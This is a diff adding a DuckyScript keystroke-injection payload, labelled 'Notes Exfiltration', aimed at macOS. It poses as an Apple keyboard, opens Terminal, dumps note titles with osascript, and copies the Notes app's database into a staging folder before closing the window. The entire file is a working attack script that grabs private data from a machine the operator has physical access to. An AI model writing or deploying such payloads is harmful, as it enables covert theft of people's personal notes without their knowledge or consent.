@@ -1,0 +1,30 @@
+REM Author: Generated
+REM Title: Notes Exfiltration
+REM Target: macOS
+REM Version: 1.0
+REM Category: Exfiltration
+REM ---
+DELAY 1000
+REM Export Notes app data
+REM Saves to ~/Documents/exfil/notes/
+REM ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING mkdir -p ~/Documents/exfil/notes
+ENTER
+DELAY 500
+STRING osascript -e 'tell application "Notes" to get name of every note' > ~/Documents/exfil/notes/notes_titles.txt
+ENTER
+DELAY 500
+STRING cp -r ~/Library/Group\ Containers/group.com.apple.notes/* ~/Documents/exfil/notes/ 2>/dev/null || echo 'Notes access failed' > ~/Documents/exfil/notes/status.txt
+ENTER
+DELAY 1000
+STRING ls -la ~/Documents/exfil/notes/
+ENTER
+DELAY 500
+GUI w
